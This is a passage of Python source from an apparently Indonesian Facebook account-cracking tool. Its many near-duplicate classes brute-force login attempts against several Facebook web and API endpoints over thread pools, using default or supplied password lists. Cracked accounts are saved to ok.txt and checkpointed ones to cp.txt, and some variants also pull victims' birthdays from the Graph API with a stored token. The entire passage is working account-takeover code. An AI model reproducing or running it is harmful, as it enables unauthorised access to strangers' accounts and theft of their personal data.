							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class tinapoe:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class hengker:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class hengkerttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class hasem:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class hasemttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class ngamodal_ajg:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class ngamodal_ajgttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+h+"•"+p+"] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class pepeklu:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.entod(isifile)
  def entod(self,isifile):
    print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+h+"•"+p+"] Pilih : ")
      if f in[""," "]:
        print((p+" ["+h+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
          self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.burut,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.burut,self.fl)
        os.remove(self.apk)
        exit()
        break
  def burutRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m * --> %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def burut(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.burutRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.burutRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class pepekluttl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.entod(isifile)
  def entod(self,isifile):
    print((p+"\n ["+h+"•"+p+"] Crack With Password Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+h+"•"+p+"] Pilih : ")
      if f in[""," "]:
        print((p+" ["+h+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+h+"•"+p+"] Example : sayang,kontol,123456"))
          self.pw=input(p+" ["+h+"•"+p+"] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.burut,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":siagoblog(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n ["+h+"•"+p+"] Crack Started..."+p+"\n ["+h+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+h+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.burut,self.fl)
        os.remove(self.apk)
        exit()
        break
  def burutRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print(("\r\x1b[0;33m * --> %s • %s • %s   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def burut(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.burutRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.burutRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### HASIL ####

def results(yuliacantik,luburikasu):
        if len(yuliacantik) !=0:
                print((p+" ["+h+"•"+p+"] OK: "+str(len(yuliacantik))))
        if len(luburikasu) !=0:
                print((p+" ["+h+"•"+p+"] CP: "+str(len(luburikasu))))
        if len(yuliacantik) ==0 and len(luburikasu) ==0:
                print("\n")
                print((p+" ["+h+"•"+p+"] No Result Found"))
   
def ress():
    os.system("clear")
    banner()
    print((p+" ["+h+"•"+p+"] Result Cracker"+p+" ["+h+"•"+p+"] "))
